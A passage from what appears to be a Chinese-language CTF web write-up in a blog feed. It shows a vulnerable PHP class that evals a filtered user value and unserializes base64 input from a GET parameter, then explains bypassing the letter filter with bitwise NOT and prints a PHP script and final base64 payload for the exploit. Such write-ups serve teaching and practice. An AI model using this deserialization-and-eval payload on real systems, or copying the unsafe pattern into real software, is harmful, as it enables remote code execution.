str_split($number,<span class="number">2</span>);</span><br><span class="line"> <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line"> $str = $str .chr($num);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> strtolower($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> chr($number);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">  $content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize((base64_decode($_GET[<span class="string">'code'</span>])));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>绕过正则用<code>%0a</code>，两位的限制，它最后有个<code>tolowercase()</code>，可以用大写绕过，</p><p>字母的过滤，利用取反操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">'FLAG'</span></span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    res += str(ord(i))</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $gf;</span><br><span class="line">&#125;</span><br><span class="line">$s = <span class="string">"70766571"</span>;</span><br><span class="line">$s = urlencode(~$s);</span><br><span class="line">$a = <span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;gf = urldecode(<span class="string">'~'</span>.$s);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($a));</span><br><span class="line"><span class="comment">//另一种写法</span></span><br><span class="line"><span class="comment">//$a = new trick();</span></span><br><span class="line"><span class="comment">//$a-&gt;gf = '~'.(~'70766571');</span></span><br></pre></td></tr></table></figure><p>最终结果为Tzo1OiJ0cmljayI6MTp7czoyOiJnZiI7czo5OiJ+yM/IycnKyM4iO30=</p><p>然后url编码传参即可</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;首先进入页面提示&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;?time=Y 或者 Y=&lt;span class=&quot;number&quot;&gt;2020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Web" scheme="https://boiteam.github.io/categories/Web/"/>
    
      <category term="PHP" scheme="https://boiteam.github.io/categories/Web/PHP/"/>
    
    
      <category term="Web_sql注入" scheme="https://boiteam.github.io/tags/Web-sql%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Web_伪协议" scheme="https://boiteam.github.io/tags/Web-%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    
  </entry>
  
</feed>
